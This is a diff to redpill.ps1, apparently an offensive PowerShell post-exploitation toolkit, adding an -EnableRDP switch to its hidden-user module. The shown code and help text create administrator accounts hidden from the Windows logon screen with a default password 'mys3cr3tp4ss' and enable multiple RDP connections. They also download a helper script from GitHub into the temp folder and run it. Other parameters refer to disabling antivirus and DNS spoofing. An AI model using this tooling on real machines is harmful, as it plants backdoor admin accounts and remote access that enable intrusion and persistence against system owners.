@@ -91,6 +91,7 @@
    [string]$ServiceName="WinDefend",
    [string]$HiddenUser="false",
    [string]$DisableAV="false",
+   [string]$EnableRDP="false",
    [string]$ToIPaddr="false",
    [string]$DnsSpoof="false",
    [string]$Sponsor="false",
@@ -2190,7 +2191,8 @@ If($HiddenUser -ne "false"){
    .NOTES
       Required Dependencies: Administrator Privileges on shell
       Mandatory requirements to {Create|Delete} or set account {Visible|Hidden} state
-      The new created user account will have 'administrators' privileges rigths set.
+      The new created user account will be added to 'administrators' Group Name
+      And desktop will allow multiple RDP connections if set -EnableRDP [ True ]
 
    .Parameter Action
       Accepts argument: Query, Create, Delete, Visible, Hidden
@@ -2201,29 +2203,36 @@ If($HiddenUser -ne "false"){
    .Parameter Password
       Accepts the User Account Password (default: mys3cr3tp4ss)
 
+   .Parameter EnableRDP
+      Accepts arguments: True and False (default: False)
+
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -Action Query
       Enumerate ALL Account's present in local system
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -Action Create -UserName "pedro"
-      Creates 'pedro' hidden account without password access and 'Adminitrator' privs
+      PS C:\> powershell -File redpill.ps1 -Action Create -UserName "SSAredTeam"
+      Creates 'SSAredTeam' hidden account without password access and 'Adminitrator' privs
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -Action Create -UserName "pedro" -Password "mys3cr3tp4ss"
-      Creates 'pedro' hidden account with password 'mys3cr3tp4ss' and 'Adminitrator' privs
+      PS C:\> powershell -File redpill.ps1 -Action Create -UserName "SSAredTeam" -Password "mys3cr3tp4ss"
+      Creates 'SSAredTeam' hidden account with password 'mys3cr3tp4ss' and 'Adminitrator' privs
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -Action Visible -UserName "pedro"
-      Makes 'pedro' User Account visible on logon screen
+      PS C:\> powershell -File redpill.ps1 -Action Create -UserName "SSAredTeam" -Password "mys3cr3tp4ss" -EnableRDP True
+      Create 'SSAredTeam' Hidden User Account with 'mys3cr3tp4ss' login password and enables multiple RDP connections.
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -Action Hidden -UserName "pedro"
-      Makes 'pedro' User Account Hidden on logon screen (default)
+      PS C:\> powershell -File redpill.ps1 -Action Visible -UserName "SSAredTeam"
+      Makes 'SSAredTeam' User Account visible on logon screen
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -Action Delete -UserName "pedro"
-      Deletes 'pedro' hidden account
+      PS C:\> powershell -File redpill.ps1 -Action Hidden -UserName "SSAredTeam"
+      Makes 'SSAredTeam' User Account Hidden on logon screen (default)
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -Action Delete -UserName "SSAredTeam"
+      Deletes 'SSAredTeam' hidden account
 
    .OUTPUTS
       Enabled Name               LastLogon           PasswordLastSet     PasswordRequired
@@ -2241,7 +2250,7 @@ If($HiddenUser -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/HiddenUser.ps1 -Destination $Env:TMP\HiddenUser.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\HiddenUser.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 15){## Corrupted download detected => DefaultFileSize: 15,7080078125/KB
+      If($SizeDump -lt 17){## Corrupted download detected => DefaultFileSize: 17,171875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\HiddenUser.ps1"){Remove-Item -Path "$Env:TMP\HiddenUser.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2277,11 +2286,11 @@ If($HiddenUser -ne "false"){
 
       If(-not($Password) -or $Password -ieq "false"){
 
-         powershell -File "$Env:TMP\HiddenUser.ps1" -Action Create -UserName "$UserName"
+         powershell -File "$Env:TMP\HiddenUser.ps1" -Action Create -UserName "$UserName" -EnableRDP $EnableRDP
 
       }Else{
 
-         powershell -File "$Env:TMP\HiddenUser.ps1" -Action Create -UserName "$UserName" -Password "$Password"
+         powershell -File "$Env:TMP\HiddenUser.ps1" -Action Create -UserName "$UserName" -Password "$Password" -EnableRDP $EnableRDP
 
       }
 
@@ -3643,7 +3652,7 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Helper - Query \ Create \ Delete Hidden User Accounts 
+      Query \ Create \ Delete Hidden User Accounts 
 
    .DESCRIPTION
       This CmdLet Querys, Creates or Deletes windows hidden accounts.
@@ -3652,11 +3661,11 @@ $HelpParameters = @"
    .NOTES
       Required Dependencies: Administrator Privileges on shell
       Mandatory requirements to {Create|Delete} or set account {Visible|Hidden} state
-      The new created user account will be added to 'administrators' Group Name. And
-      desktop will allow multiple RDP connections { AllowTSConnections }
+      The new created user account will be added to 'administrators' Group Name
+      And desktop will allow multiple RDP connections if set -EnableRDP [ True ]
 
-   .Parameter HiddenUser
-      Accepts arguments: Query, Verbose, Create, Delete, Visible, Hidden
+   .Parameter Action
+      Accepts argument: Query, Create, Delete, Visible, Hidden
 
    .Parameter UserName
       Accepts the User Account Name (default: SSAredTeam)
@@ -3664,34 +3673,36 @@ $HelpParameters = @"
    .Parameter Password
       Accepts the User Account Password (default: mys3cr3tp4ss)
 
+   .Parameter EnableRDP
+      Accepts arguments: True and False (default: False)
+
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -HiddenUser Query
+      PS C:\> powershell -File redpill.ps1 -Action Query
       Enumerate ALL Account's present in local system
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -HiddenUser Verbose
-      Enumerate ALL Account's present in local system and
-      List All Account's owned by 'Adminstrators' Group Name
+      PS C:\> powershell -File redpill.ps1 -Action Create -UserName "SSAredTeam"
+      Creates 'SSAredTeam' hidden account without password access and 'Adminitrator' privs
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -HiddenUser Create -UserName "pedro"
-      Creates 'pedro' hidden account without password access and 'Administrator' privs
+      PS C:\> powershell -File redpill.ps1 -Action Create -UserName "SSAredTeam" -Password "mys3cr3tp4ss"
+      Creates 'SSAredTeam' hidden account with password 'mys3cr3tp4ss' and 'Adminitrator' privs
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -HiddenUser Create -UserName "pedro" -Password "mys3cr3tp4ss"
-      Creates 'pedro' hidden account with password 'mys3cr3tp4ss' and 'Administrator' privs
+      PS C:\> powershell -File redpill.ps1 -Action Create -UserName "SSAredTeam" -Password "mys3cr3tp4ss" -EnableRDP True
+      Create 'SSAredTeam' Hidden User Account with 'mys3cr3tp4ss' login password and enables multiple RDP connections.
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -HiddenUser Visible -UserName "pedro"
-      Makes 'pedro' User Account visible on logon screen
+      PS C:\> powershell -File redpill.ps1 -Action Visible -UserName "SSAredTeam"
+      Makes 'SSAredTeam' User Account visible on logon screen
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -HiddenUser Hidden -UserName "pedro"
-      Makes 'pedro' User Account Hidden on logon screen (default)
+      PS C:\> powershell -File redpill.ps1 -Action Hidden -UserName "SSAredTeam"
+      Makes 'SSAredTeam' User Account Hidden on logon screen (default)
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -HiddenUser Delete -UserName "pedro"
-      Deletes 'pedro' hidden account
+      PS C:\> powershell -File redpill.ps1 -Action Delete -UserName "SSAredTeam"
+      Deletes 'SSAredTeam' hidden account
 
    .OUTPUTS
       Enabled Name               LastLogon           PasswordLastSet     PasswordRequired
